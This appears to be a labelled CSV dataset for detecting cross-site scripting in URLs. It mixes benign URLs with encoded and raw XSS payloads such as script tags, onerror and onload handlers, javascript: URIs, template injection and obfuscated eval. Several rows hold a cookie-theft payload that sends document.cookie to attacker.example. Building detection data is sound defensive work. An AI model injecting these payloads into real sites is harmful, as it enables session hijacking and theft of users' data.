url,payload,carrier,param_name,encoded,notes,label
https://testsite.local/search?session=category,category,query,session,raw,benign,0
https://webapp.local/page#1,1,fragment,,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&ref=xyz,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,redirect,s,raw,cookie_exfil,1
https://blog.example/api?callback=product&id=1&ref=1,product,callback,name,raw,benign,0
https://blog.example/search?session=contact&source=affiliate,contact,query,session,raw,benign,0
https://webapp.local/api?callback=cart-2025&id=1&source=organic,cart-2025,callback,input,raw,benign,0
https://shop.example/user/cart/profile,cart,path,,raw,benign,0
https://example.com/search?input=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,query,input,urlencoded,document_location_js,1
https://catalog.example/search?name=prices,prices,query,name,raw,benign,0
https://testsite.local/page#<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,raw,svg_cdata_script,1
https://mysite.example/api?callback=signup-usr&id=1,signup-usr,callback,callback,raw,benign,0
https://shop.example/search?s=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"""><img src=x onerror=alert(1)>",query,s,urlencoded,attribute_breakout_img,1
https://catalog.example/search?callback=test,test,query,callback,raw,benign,0
https://webapp.local/search?id=%22%3E%3Csvg%20onload%3Dalert%281%29%3E&session=xyz,"""><svg onload=alert(1)>",query,id,urlencoded,attribute_breakout_svg,1
https://testsite.local/search?term=checkout,checkout,query,term,raw,benign,0
https://shop.example/search?q=category,category,query,q,raw,benign,0
https://demo.example.org/search?name=page&lang=affiliate,page,query,name,raw,benign,0
https://catalog.example/search?redirect=order,order,query,redirect,raw,benign,0
https://service.test/user/{{constructor.constructor('alert(1)')()}}/profile,{{constructor.constructor('alert(1)')()}},path,,raw,template_injection,1
https://shop.example/search?view=blog-ref,blog-ref,query,view,raw,benign,0
"https://demo.example.org/search?file=&#x27;);eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&lang=0","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,file,html_entity,eval_obf,1
https://example.com/search?msg=%3Cbody%20onload%3Dalert%281%29%3E,<body onload=alert(1)>,query,msg,urlencoded,body_onload,1
https://demo.example.org/search?view=profile&ref=organic,profile,query,view,raw,benign,0
https://demo.example.org/api?callback=%2527%2529%253Balert%25281%2529%253B%252F%252F&id=1,');alert(1);//,callback,callback,double_urlencoded,inline_js_snippet,1
https://demo.example.org/search?callback=details&page=organic,details,query,callback,raw,benign,0
https://vulnerable.app/page#%22%3E%3Csvg+onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",fragment,,mixed,attribute_breakout_svg,1
https://shop.example/user/contact/profile,contact,path,,raw,benign,0
https://shop.example/search?name=2025-10-01&source=0,2025-10-01,query,name,raw,benign,0
https://blog.example/search?msg=news&page=0,news,query,msg,raw,benign,0
https://service.test/search?query=&#x27;);alert(1);//&page=google,');alert(1);//,query,query,html_entity,inline_js_snippet,1
https://demo.example.org/search?ref=welcome,welcome,query,ref,raw,benign,0
https://portal.example.net/search?lang=welcome17354,welcome17354,query,lang,raw,benign,0
https://mysite.example/search?msg=checkout&ref=en,checkout,query,msg,raw,benign,0
https://demo.example.org/search?search=cart,cart,query,search,raw,benign,0
https://portal.example.net/search?callback=welcome79349,welcome79349,query,callback,raw,benign,0
https://catalog.example/search?term=signup,signup,query,term,raw,benign,0
https://blog.example/user/home/profile,home,path,,raw,benign,0
https://vulnerable.app/page#{{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},fragment,,raw,template_injection,1
https://testsite.local/search?session=signup&utm_source=0,signup,query,session,raw,benign,0
https://webapp.local/search?callback=%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&lang=newsletter,"""><video><source onerror=alert(1)></video>",query,callback,urlencoded,attribute_breakout_video,1
https://blog.example/api?callback=blog&id=1&utm_source=1,blog,callback,search,raw,benign,0
https://catalog.example/page#42,42,fragment,,raw,benign,0
https://demo.example.org/api?callback=en&id=1,en,callback,term,raw,benign,0
https://testsite.local/api?callback=signup&id=1,signup,callback,s,raw,benign,0
"https://example.com/redirect?url=https://victim.example/?p=""><img src=x onerror=alert(1)>&session=newsletter","""><img src=x onerror=alert(1)>",redirect,term,raw,attribute_breakout_img,1
https://demo.example.org/user/index/profile,index,path,,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,redirect,input,urlencoded,script_tag,1
https://service.test/page#%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,fragment,,urlencoded,document_location_js,1
https://webapp.local/search?s=cart&lang=google,cart,query,s,raw,benign,0
https://portal.example.net/search?search=%3Cbody+onload%3Dalert%281%29%3E&utm_source=google,<body onload=alert(1)>,query,search,mixed,body_onload,1
https://testsite.local/page#login,login,fragment,,raw,benign,0
https://demo.example.org/api?callback=user&id=1,user,callback,redirect,raw,benign,0
https://demo.example.org/search?input=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,input,double_urlencoded,eval_obf,1
https://service.test/redirect?url=https://victim.example/?p=&quot;&gt;&lt;svg onload=alert(1)&gt;,"""><svg onload=alert(1)>",redirect,q,html_entity,attribute_breakout_svg,1
https://service.test/api?callback=cart&id=1,cart,callback,input,raw,benign,0
https://mysite.example/search?ref=2025-10-01,2025-10-01,query,ref,raw,benign,0
https://webapp.local/page#%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,fragment,,urlencoded,cookie_exfil,1
https://example.com/redirect?url=https://victim.example/?p=%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,redirect,q,double_urlencoded,svg_cdata_script,1
https://catalog.example/api?callback=cart1202&id=1&source=en,cart1202,callback,term,raw,benign,0
https://service.test/search?url=javascript%3Aalert%281%29&page=xyz,javascript:alert(1),query,url,urlencoded,js_uri,1
https://demo.example.org/page#%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,"""><video><source onerror=alert(1)></video>",fragment,,urlencoded,attribute_breakout_video,1
https://webapp.local/search?query=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,"""><img src=x onerror=alert(1)>",query,query,double_urlencoded,attribute_breakout_img,1
https://example.com/search?input=<body onload=alert(1)>,<body onload=alert(1)>,query,input,raw,body_onload,1
https://demo.example.org/redirect?url=https://victim.example/?p=article&source=newsletter,article,redirect,callback,raw,benign,0
https://testsite.local/api?callback=cart&id=1&page=newsletter,cart,callback,url,raw,benign,0
https://shop.example/search?view=about,about,query,view,raw,benign,0
https://blog.example/redirect?url=https://victim.example/?p=blog&utm_source=en,blog,redirect,url,raw,benign,0
https://demo.example.org/page#%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,fragment,,urlencoded,already_encoded,1
https://catalog.example/redirect?url=https://victim.example/?p=test,test,redirect,input,raw,benign,0
https://webapp.local/search?id=checkout,checkout,query,id,raw,benign,0
https://webapp.local/user/user/profile,user,path,,raw,benign,0
https://portal.example.net/search?input=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,input,urlencoded,already_encoded,1
https://catalog.example/search?input=index&lang=google,index,query,input,raw,benign,0
https://webapp.local/api?callback=42&id=1&ref=newsletter,42,callback,view,raw,benign,0
https://demo.example.org/api?callback=home&id=1&utm_source=0,home,callback,search,raw,benign,0
https://blog.example/search?input=product-usr,product-usr,query,input,raw,benign,0
https://mysite.example/redirect?url=https://victim.example/?p=contact,contact,redirect,term,raw,benign,0
https://service.test/search?input=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,input,raw,script_in_math,1
https://portal.example.net/search?lang=login,login,query,lang,raw,benign,0
https://demo.example.org/api?callback=order&id=1,order,callback,msg,raw,benign,0
https://example.com/search?tmpl=%2527%2529%253Balert%25281%2529%253B%252F%252F,');alert(1);//,query,tmpl,double_urlencoded,inline_js_snippet,1
https://testsite.local/page#item,item,fragment,,raw,benign,0
https://service.test/search?input=en&session=en,en,query,input,raw,benign,0
https://shop.example/api?callback=42&id=1,42,callback,page,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=about&page=affiliate,about,redirect,session,raw,benign,0
https://vulnerable.app/user/&lt;body onload=alert(1)&gt;/profile,<body onload=alert(1)>,path,,html_entity,body_onload,1
https://webapp.local/search?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,url,urlencoded,script_tag,1
https://shop.example/page#');alert(1);//,');alert(1);//,fragment,,raw,inline_js_snippet,1
https://testsite.local/api?callback=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&id=1&utm_source=google,%3Cscript%3Ealert(1)%3C/script%3E,callback,callback,urlencoded,already_encoded,1
https://blog.example/page#contact,contact,fragment,,raw,benign,0
https://portal.example.net/search?ref=user,user,query,ref,raw,benign,0
https://example.com/search?callback=about&session=google,about,query,callback,raw,benign,0
https://testsite.local/redirect?url=https://victim.example/?p=%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E,"""><svg onload=alert(1)>",redirect,s,double_urlencoded,attribute_breakout_svg,1
https://webapp.local/search?url=%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&lang=1,"""><video><source onerror=alert(1)></video>",query,url,urlencoded,attribute_breakout_video,1
https://demo.example.org/api?callback=test&id=1&session=affiliate,test,callback,redirect,raw,benign,0
https://example.com/page#%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,fragment,,urlencoded,already_encoded,1
https://webapp.local/api?callback=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&id=1&ref=xyz,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,redirect,raw,svg_cdata_script,1
https://webapp.local/search?utm_source=page,page,query,utm_source,raw,benign,0
https://demo.example.org/api?callback=blog-ref&id=1,blog-ref,callback,msg,raw,benign,0
"https://example.com/user/""><video><source onerror=alert(1)></video>/profile","""><video><source onerror=alert(1)></video>",path,,raw,attribute_breakout_video,1
https://webapp.local/search?id=en&session=google,en,query,id,raw,benign,0
https://shop.example/search?input=&quot;&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;,"""><video><source onerror=alert(1)></video>",query,input,html_entity,attribute_breakout_video,1
https://example.com/api?callback=blog&id=1,blog,callback,file,raw,benign,0
https://testsite.local/user/1/profile,1,path,,raw,benign,0
https://webapp.local/search?lang=page&lang=google,page,query,lang,raw,benign,0
https://shop.example/search?session=welcome&lang=newsletter,welcome,query,session,raw,benign,0
https://service.test/search?id=1,1,query,id,raw,benign,0
https://portal.example.net/user/prices/profile,prices,path,,raw,benign,0
https://portal.example.net/user/blog/profile,blog,path,,raw,benign,0
https://example.com/search?callback=contact&source=google,contact,query,callback,raw,benign,0
https://portal.example.net/user/prices/profile,prices,path,,raw,benign,0
https://demo.example.org/search?msg=home,home,query,msg,raw,benign,0
https://testsite.local/search?query=javascript%3Aalert%281%29&lang=xyz,javascript:alert(1),query,query,mixed,js_uri,1
https://shop.example/search?term=product&source=affiliate,product,query,term,raw,benign,0
"https://portal.example.net/search?query=""><video><source onerror=alert(1)></video>&ref=google","""><video><source onerror=alert(1)></video>",query,query,raw,attribute_breakout_video,1
https://shop.example/user/42/profile,42,path,,raw,benign,0
https://catalog.example/page#about,about,fragment,,raw,benign,0
https://portal.example.net/search?input=blog,blog,query,input,raw,benign,0
https://example.com/user/javascript:alert(1)/profile,javascript:alert(1),path,,raw,js_uri,1
https://shop.example/search?q=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,q,urlencoded,meta_refresh_js_uri,1
https://shop.example/search?msg=profile,profile,query,msg,raw,benign,0
https://webapp.local/search?q=item&page=1,item,query,q,raw,benign,0
https://catalog.example/page#1,1,fragment,,raw,benign,0
https://webapp.local/search?url=news-info,news-info,query,url,raw,benign,0
https://mysite.example/search?s=42,42,query,s,raw,benign,0
https://webapp.local/search?name=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E,<iframe src='javascript:alert(1)'></iframe>,query,name,mixed,iframe_js_uri,1
https://webapp.local/search?utm_source=index&source=0,index,query,utm_source,raw,benign,0
https://webapp.local/search?name=user,user,query,name,raw,benign,0
"https://example.com/redirect?url=https://victim.example/?p=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",redirect,view,raw,attribute_breakout_video,1
https://webapp.local/search?page=blog&session=organic,blog,query,page,raw,benign,0
https://service.test/search?page=');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,query,page,raw,document_location_js,1
https://portal.example.net/user/cart/profile,cart,path,,raw,benign,0
https://example.com/search?search=en&lang=0,en,query,search,raw,benign,0
https://portal.example.net/user/en/profile,en,path,,raw,benign,0
https://testsite.local/user/%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E/profile,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,path,,urlencoded,script_in_math,1
https://example.com/api?callback=&#x27;);alert(1);//&id=1,');alert(1);//,callback,s,html_entity,inline_js_snippet,1
https://webapp.local/user/%253Cscript%253Ealert%281%29%253C%2Fscript%253E/profile,%3Cscript%3Ealert(1)%3C/script%3E,path,,urlencoded,already_encoded,1
https://portal.example.net/search?view=page&ref=en,page,query,view,raw,benign,0
https://testsite.local/api?callback=page-ref&id=1&ref=en,page-ref,callback,view,raw,benign,0
https://mysite.example/search?ref=1&utm_source=organic,1,query,ref,raw,benign,0
https://webapp.local/search?url=cart-usr&source=affiliate,cart-usr,query,url,raw,benign,0
https://mysite.example/search?utm_source=article,article,query,utm_source,raw,benign,0
https://mysite.example/search?view=blog&lang=google,blog,query,view,raw,benign,0
https://service.test/user/page/profile,page,path,,raw,benign,0
https://webapp.local/search?file=login-usr,login-usr,query,file,raw,benign,0
https://service.test/search?ref=welcome83947,welcome83947,query,ref,raw,benign,0
https://shop.example/search?callback=category&page=en,category,query,callback,raw,benign,0
https://testsiTe.lOcal/user/{{constructor.constructor(&#x27;alert(1)&#x27;)()}}/profile,{{constructor.constructor('alert(1)')()}},path,,html_entity,template_injection,1
https://webapp.local/search?id=home,home,query,id,raw,benign,0
"https://webapp.local/api?callback=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>&id=1","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",callback,callback,raw,img_onerror_obf,1
https://example.com/redirect?url=https://victim.example/?p=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",redirect,search,urlencoded,img_onerror_obf,1
"https://testsite.local/search?callback=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,callback,raw,attribute_breakout_svg,1
https://webapp.local/api?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&id=1&lang=newsletter,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,raw,meta_refresh_js_uri,1
https://example.com/search?page=javascript%253Aalert%25281%2529&utm_source=en,javascript:alert(1),query,page,double_urlencoded,js_uri,1
https://shop.example/api?callback=en-ref&id=1,en-ref,callback,page,raw,benign,0
https://shop.example/search?file=checkout&page=1,checkout,query,file,raw,benign,0
https://testsite.local/search?term=en,en,query,term,raw,benign,0
https://portal.example.net/search?page=login-new,login-new,query,page,raw,benign,0
https://webapp.local/user/order/profile,order,path,,raw,benign,0
https://service.test/search?msg=2025-10-01-details&page=organic,2025-10-01-details,query,msg,raw,benign,0
https://demo.example.org/search?file=contact&session=google,contact,query,file,raw,benign,0
https://testsite.local/search?url=&#x27;);alert(1);//,');alert(1);//,query,url,html_entity,inline_js_snippet,1
https://testsite.local/api?callback=item&id=1,item,callback,q,raw,benign,0
https://portal.example.net/api?callback=login&id=1,login,callback,query,raw,benign,0
https://portal.example.net/search?page=news,news,query,page,raw,benign,0
https://service.test/api?callback=checkout&id=1,checkout,callback,lang,raw,benign,0
https://example.com/search?tmpl=%22%3E%3Csvg%20onload%3Dalert%281%29%3E&utm_source=google,"""><svg onload=alert(1)>",query,tmpl,urlencoded,attribute_breakout_svg,1
https://blog.example/search?name=blog,blog,query,name,raw,benign,0
https://service.test/search?redirect=checkout,checkout,query,redirect,raw,benign,0
https://testsite.local/search?term=prices,prices,query,term,raw,benign,0
https://demo.example.org/search?name=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,name,urlencoded,img_onerror_obf,1
https://example.com/search?msg=en,en,query,msg,raw,benign,0
https://testsite.local/search?term=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,term,urlencoded,eval_obf,1
https://webapp.local/search?term=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,term,urlencoded,already_encoded,1
https://service.test/search?q=details,details,query,q,raw,benign,0
https://vulnerable.app/search?file=%3Cbody%20onload%3Dalert%281%29%3E&session=newsletter,<body onload=alert(1)>,query,file,urlencoded,body_onload,1
https://webapp.local/redirect?url=https://victim.example/?p=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E,<iframe src='javascript:alert(1)'></iframe>,redirect,callback,urlencoded,iframe_js_uri,1
https://catalog.example/api?callback=signup-info&id=1&lang=1,signup-info,callback,view,raw,benign,0
https://shop.example/page#%253Cmath%253E%253Cmi%253E%253C%252Fmi%253E%253Cmfrac%253E%253Cmn%253E%253C%252Fmn%253E%253C%252Fmfrac%253E%253C%252Fmath%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,fragment,,double_urlencoded,script_in_math,1
https://portal.example.net/redirect?url=https://victim.example/?p=order&session=1,order,redirect,s,raw,benign,0
https://demo.example.org/search?id=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&lang=1,%3Cscript%3Ealert(1)%3C/script%3E,query,id,urlencoded,already_encoded,1
https://webapp.local/api?callback=%253Cimg%2520src%253D1%2520onerror%253Dalert%2528String.fromCharCode%252888%252C83%252C83%2529%2529%253E&id=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",callback,callback,double_urlencoded,img_onerror_obf,1
"https://shop.example/search?msg=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,msg,raw,attribute_breakout_svg,1
https://webapp.local/search?callback=about&session=google,about,query,callback,raw,benign,0
https://vulnerable.app/api?callback=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F&id=1&utm_source=google,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,callback,double_urlencoded,eval_obf,1
https://testsite.local/search?callback=1&lang=affiliate,1,query,callback,raw,benign,0
https://catalog.example/search?search=42,42,query,search,raw,benign,0
https://service.test/search?query=product&source=newsletter,product,query,query,raw,benign,0
https://webapp.local/api?callback=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E&id=1&lang=en,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,callback,callback,mixed,cookie_exfil,1
https://catalog.example/search?input=cart,cart,query,input,raw,benign,0
https://mysite.example/search?id=contact,contact,query,id,raw,benign,0
https://shop.example/page#prices,prices,fragment,,raw,benign,0
https://blog.example/page#category,category,fragment,,raw,benign,0
https://example.com/search?page=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,page,urlencoded,svg_cdata_script,1
https://mysite.example/page#prices,prices,fragment,,raw,benign,0
https://webapp.local/search?lang=home-2025&lang=newsletter,home-2025,query,lang,raw,benign,0
https://testsite.local/search?msg=test,test,query,msg,raw,benign,0
https://catalog.example/search?s=category&ref=organic,category,query,s,raw,benign,0
https://mysite.example/api?callback=prices&id=1,prices,callback,id,raw,benign,0
"https://example.com/search?page=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,page,raw,eval_obf,1
https://example.com/redirect?url=https://victim.example/?p=%253Cbody%2520onload%253Dalert%25281%2529%253E,<body onload=alert(1)>,redirect,name,double_urlencoded,body_onload,1
https://example.com/search?file=%253Cimg%2520src%253D1%2520onerror%253Dalert%2528String.fromCharCode%252888%252C83%252C83%2529%2529%253E&page=xyz,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,file,double_urlencoded,img_onerror_obf,1
https://portal.example.net/user/%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F/profile,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",path,,urlencoded,eval_obf,1
https://webapp.local/search?search=checkout86645&utm_source=0,checkout86645,query,search,raw,benign,0
https://blog.example/search?file=welcome&page=0,welcome,query,file,raw,benign,0
https://shop.example/search?view=%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,"""><video><source onerror=alert(1)></video>",query,view,urlencoded,attribute_breakout_video,1
https://vulnerable.app/search?tmpl={{constructor.constructor(&#x27;alert(1)&#x27;)()}},{{constructor.constructor('alert(1)')()}},query,tmpl,html_entity,template_injection,1
https://portal.example.net/search?view=order&utm_source=0,order,query,view,raw,benign,0
https://blog.example/page#42,42,fragment,,raw,benign,0
https://testsite.local/api?callback=order&id=1,order,callback,ref,raw,benign,0
https://webapp.local/search?query=details&page=0,details,query,query,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=details,details,redirect,url,raw,benign,0
https://shop.example/page#test,test,fragment,,raw,benign,0
https://service.test/search?file=');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,query,file,raw,document_location_js,1
https://shop.example/search?name=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&lang=en,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,name,urlencoded,meta_refresh_js_uri,1
"https://demo.example.org/search?term=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,term,raw,img_onerror_obf,1
https://testsite.local/search?msg=blog-2025,blog-2025,query,msg,raw,benign,0
https://webapp.local/search?url=category34315,category34315,query,url,raw,benign,0
https://blog.example/search?s=home,home,query,s,raw,benign,0
https://tEstsite.locAl/redirect?url=https://victim.example/?p=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&session=en,%3Cscript%3Ealert(1)%3C/script%3E,redirect,name,urlencoded,already_encoded,1
https://demo.example.org/api?callback=javascript%3Aalert%281%29&id=1&page=0,javascript:alert(1),callback,redirect,mixed,js_uri,1
https://example.com/api?callback=en&id=1&session=1,en,callback,page,raw,benign,0
https://catalog.example/search?lang=article&session=0,article,query,lang,raw,benign,0
https://catalog.example/search?lang=2025-10-01-ref&lang=1,2025-10-01-ref,query,lang,raw,benign,0
https://demo.example.org/search?file=product,product,query,file,raw,benign,0
"https://vulnerable.app/search?tmpl=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,tmpl,raw,attribute_breakout_video,1
https://vulnerable.app/user/<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>/profile&ref=en,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,raw,cookie_exfil,1
https://shop.example/page#<body onload=alert(1)>,<body onload=alert(1)>,fragment,,raw,body_onload,1
https://portal.example.net/page#test,test,fragment,,raw,benign,0
